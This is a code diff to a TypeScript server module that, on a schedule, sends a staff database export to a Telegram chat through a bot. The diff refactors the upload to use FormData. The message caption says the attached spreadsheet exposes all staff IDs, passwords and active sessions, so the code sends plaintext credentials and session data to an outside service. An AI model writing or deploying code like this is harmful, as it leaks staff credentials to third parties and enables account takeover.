@@ -5,10 +5,15 @@
 
 import fs from 'fs';
 import path from 'path';
+import dns from 'dns';
 import { db } from './serverDb';
 import { generateStaffSessionsExcelXml } from './staffSessionExcelDatabase';
 import { getTelegramCredentials } from '@/config/telegram';
 import { resolveNumericChatId } from './autoTelegramExcelSync';
+
+try {
+  dns.setDefaultResultOrder('ipv4first');
+} catch (e) {}
 
 let isSchedulerStarted = false;
 
@@ -73,21 +78,16 @@ export async function autoDispatchStaffDatabaseToTelegram(
       `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
       `📂 *Multi-Sheet Excel Database (.xls) attached below.* Open in Google Sheets or Microsoft Excel to monitor all staff IDs, passwords & active sessions in real time!`;
 
-    const boundary = `----TelegramBoundaryStaff${Date.now()}`;
-    const formDataParts = [
-      `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${resolvedChatId}\r\n`,
-      `--${boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nMarkdown\r\n`,
-      `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`,
-      `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${filename}"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n${xmlContent}\r\n`,
-      `--${boundary}--\r\n`,
-    ];
+    const blob = new Blob([xmlContent], { type: 'application/vnd.ms-excel' });
+    const formData = new FormData();
+    formData.append('chat_id', resolvedChatId);
+    formData.append('caption', caption);
+    formData.append('parse_mode', 'Markdown');
+    formData.append('document', blob, filename);
 
     const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
       method: 'POST',
-      headers: {
-        'Content-Type': `multipart/form-data; boundary=${boundary}`,
-      },
-      body: formDataParts.join(''),
+      body: formData,
     });
 
     const tgData = await tgRes.json();
